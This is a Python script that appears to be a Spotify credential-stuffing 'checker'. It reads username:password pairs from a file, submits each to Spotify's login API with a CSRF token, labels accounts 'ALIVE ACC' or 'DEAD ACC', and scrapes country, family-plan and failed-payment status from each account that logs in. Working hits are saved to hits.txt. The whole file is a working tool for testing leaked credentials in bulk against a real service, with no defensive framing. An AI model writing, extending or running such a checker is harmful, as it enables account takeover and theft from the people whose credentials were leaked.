import requests
import json
import colorama
from bs4 import BeautifulSoup

colorama.init(autoreset=True)

def login(username, password, accs):
	s = requests.Session()
	resp = s.get("https://accounts.spotify.com/en/login/")
	cookies = resp.cookies.get_dict()
	familyowner = False
	familymember = False
	paused = False

	payload = {
		"remember": True,
		"username": username,
		"password": password,
		"csrf_token": cookies['csrf_token']
	}

	cookie = {
		"__bon": "putyourownbonhere",
		"csrf_token": cookies['csrf_token']
	}

	resp = s.post("https://accounts.spotify.com/api/login", data=payload, cookies=cookie)
	json_data = json.loads(resp.text)

	if "error" in json_data:
		print(f"{username}:{password} | {colorama.Fore.RED} DEAD ACC")
		return accs
	else:
		user_page = s.get("https://www.spotify.com/account/overview/")
		user_find = BeautifulSoup(user_page.text, "html.parser")

		country = user_find.find("p", {"id": "card-profile-country"}).getText()
		print(f"{username}:{password} | {colorama.Fore.GREEN} ALIVE ACC: {country}")

	try:
		if user_find.find("h3", {"class": "product-name"}).getText() == "Premium for Family":
			familymember = True
	except:
		pass
	if user_find.find("p", {"class": "subscription-status subscription-compact"}).getText() == """
            Your last payment didn't work. Continue listening with Premium by adding a new payment method.
        """:
			paused = True
	if user_find.find("a", {"id": "btn-manage-familyplan"}):
		familyowner = True

	accs[f"{username}:{password}"] = {
		"alive": True,
		"country": country,
		"familyowner": familyowner,
		"familymember": familymember,
		"paused": paused
	}

	return accs

accs = {}
acc_cnt = 0

for account in open('accounts.txt', 'r').read().split("\n"):
	acc_cnt += 1
	print(str(acc_cnt) + ": ", end='')
	username, password = account.split(":")
	try:
		accs = login(username, password, accs)
	except:
		pass

with open('hits.txt', 'w+') as f:
	f.write(json.dumps(accs))
